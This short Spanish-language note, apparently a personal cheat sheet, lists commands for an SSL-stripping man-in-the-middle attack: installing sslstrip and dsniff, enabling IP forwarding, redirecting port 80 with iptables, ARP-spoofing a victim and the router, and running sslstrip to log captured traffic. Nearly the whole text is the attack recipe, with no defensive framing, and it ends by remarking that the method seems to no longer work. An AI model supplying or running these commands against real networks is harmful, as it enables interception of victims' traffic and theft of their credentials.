Hack de HTTPS con macspoof

https://github.com/moxie0/sslstrip
http://www.thoughtcrime.org/software/sslstrip/

sudo apt-get install python-twisted-web
git clone https://github.com/moxie0/sslstrip.git
cd sslstrip
echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
apt-get install dsniff

Hacemos arpspoof para que todo el tráfico pase por mi pc
arpspoof -i eth0 -t ip.de.la.victima ip.del.router
arpspoof -i eth0 -t ip.del.router ip.de.la.victima

python sslstrip.py -a -w capture.log -l 8080

Parece que ya no funciona
